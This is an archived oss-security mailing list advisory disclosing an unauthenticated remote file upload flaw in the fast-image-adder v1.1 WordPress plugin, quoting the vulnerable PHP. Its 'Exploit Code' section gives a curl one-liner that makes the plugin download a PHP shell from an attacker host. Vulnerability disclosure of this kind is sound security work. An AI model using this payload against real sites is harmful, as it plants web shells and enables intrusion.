X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1923" "Thursday" "16" "July" "2015" "21:51:20" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<450DDE72-8853-4E64-B50C-285C5497776E@me.com>" "48" "[oss-security] Remote file upload vulnerability in fast-image-adder v1.1 Wordpress plugin" nil nil nil "7" "2015071701:51:20" "[oss-security] Remote file upload vulnerability in fast-image-adder v1.1 Wordpress plugin" (number mark "U       larry0@me.co Jul 16   48/1923  " thread-indent "\"[oss-security] Remote file upload vulnerability in fast-image-adder v1.1 Wordpress plugin\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 14332 invoked by uid 550); 17 Jul 2015 01:51:48 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 14289 invoked from network); 17 Jul 2015 01:51:40 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.14.151,1.0.33,0.0.0000
 definitions=2015-07-17_01:2015-07-17,2015-07-16,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1507170020
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <450DDE72-8853-4E64-B50C-285C5497776E@me.com>
Date: Thu, 16 Jul 2015 21:51:20 -0400
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
X-Mailer: Apple Mail (2.2098)
Subject: [oss-security] Remote file upload vulnerability in fast-image-adder v1.1 Wordpress
 plugin

Title: Remote file upload vulnerability in fast-image-adder v1.1 Wordpress =
plugin
Author: Larry W. Cashdollar, @_larry0
Date: 2015-07-10
Download Site: https://wordpress.org/plugins/fast-image-adder
Vendor: https://profiles.wordpress.org/robbyslaughter/
Vendor Notified: 2015-07-10, plugin silently pulled?
Vendor Contact: plugins@wordpress.org
Description: Add images to your blog posts from a URL in a flash. Skip the =
download/upload steps and the slow WordPress dialog box.
Vulnerability:
The  fast-image-adder-uploader.php  file doesn't check if a user is authori=
zed to upload files: It creates a random file name, but reports the name ba=
ck to the user.

 60          $upload_dir =3D wp_upload_dir();
 61          $path =3D $upload_dir['path'];
 62          $new_filename =3D $suggested_name_filesystem . "_" . random_fi=
lename() . substr($url,strrpos($url,"."));
 63=20=20=20=20=20=20=20=20=20=20
 64=20
 65          // If we are not in test mode, get the file and resize it=20=
=20=20=20=20=20=20=20=20
 66          if ($test_mode =3D=3D=3D FALSE)
 67          {
 68            $image_data =3D file_get_contents($url);
 69            file_put_contents($path . "/" . $new_filename,$image_data);
 70            resize($path . "/" . $new_filename, $new_height, $new_width,=
 $val_maxwidth, $path . "/" . $new_filename);
 71          }=20=20=20
 72=20=20=20=20=20=20=20=20=20=20
 73          $new_url =3D $upload_dir['url'] . "/" . $new_filename;
=2E
=2E

 83          if ($test_mode =3D=3D=3D FALSE)
 84          {
 85            echo "Uploaded as " . $new_url;
 86          }

CVEID:
OSVDB:
Exploit Code:
	=E2=80=A2 $ curl http://www.example.com/wp-content/plugins/fast-image-adde=
r/fast-image-adder-uploader.php?confirm=3Durl&url=3Dhttp://192.168.0.2/shel=
l.php
	=E2=80=A2 Shell location is reported back to the user with random filename=
.  The url site must not interpret php, but allow it for download.=
